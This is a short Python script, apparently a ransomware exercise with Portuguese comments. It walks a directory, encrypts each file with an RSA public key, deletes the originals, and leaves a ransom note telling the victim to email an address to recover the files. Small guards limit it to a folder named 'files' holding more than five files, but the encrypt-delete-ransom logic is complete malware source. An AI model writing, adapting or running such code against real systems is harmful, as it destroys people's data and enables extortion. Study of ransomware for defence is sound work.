import os
import argparse
import glob
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives import serialization

LIMIT = 5

# Função para criptografar arquivos
def encrypt_file(filepath, public_key):
    with open(filepath, "rb") as f:
        plaintext = f.read()

    ciphertext = public_key.encrypt(
        plaintext,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    with open(filepath + ".enc", "wb") as f:
        f.write(ciphertext)

    os.remove(filepath)  # Remove o arquivo original

def main(args):
  input_path = args.input

  if not os.path.isdir(input_path):
      print("Precisa ser um diretório")
      return

  # Para teste
  if not input_path.endswith("files"):
      print("CUIDADO")
      return
  
  # Carregar a chave pública
  with open("public_key.pem", "rb") as f:
      public_key = serialization.load_pem_public_key(f.read())

  total_files = sum(len(files) for _, _, files in os.walk(input_path))

  for root, _, files in os.walk(input_path):
        for file in files:
          filepath = os.path.join(root, file)
          if total_files > LIMIT:
            if not filepath.endswith(".enc"):  # Evita recriptografar arquivos
                encrypt_file(filepath, public_key)
          else:
              file_size = os.path.getsize(filepath)
              print(f"{filepath}: {file_size} bytes")
  if total_files > LIMIT:
    with open(os.path.join(input_path + "/!!!!!!!!INSTRUCOES!!!!!!!!.txt"), "w") as f:
                  f.write("Contate o email foo@gmail.com para recuperar seus arquivos")
    print("!!!!!!!!INSTRUCOES!!!!!!!!.txt")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--input", type=str, required=True)
    args = parser.parse_args()

    main(args)
